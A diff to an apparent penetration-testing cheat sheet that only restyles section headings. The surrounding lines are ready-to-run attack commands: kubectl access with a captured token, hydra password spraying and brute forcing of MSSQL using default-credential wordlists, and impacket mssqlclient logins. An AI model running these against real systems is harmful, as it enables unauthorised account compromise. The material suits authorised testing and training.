@@ -855,15 +855,15 @@ kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat tok
 kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) get pod
 
 [*] (1433) MSSQL
-+---------- Spray ----------+
+[###] Spray
 (hydra -I mssql://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
-+---------- Bruteforce ----------+
+[###] Bruteforce
 cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f1 | sort -u > /tmp/mssqlusernames
 cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f2 | sort -u > /tmp/mssqlpasswords
 hydra -I mssql://$TARGET -L /tmp/mssqlusernames -P /tmp/mssqlpasswords -e n -t15 2>/dev/null
 
-+---------- Login ----------+
+[###] Login
 impacket-mssqlclient -k -no-pass -dc-ip $TARGET -target-ip $TARGET $DC
 impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET'
 impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET' -windows-auth
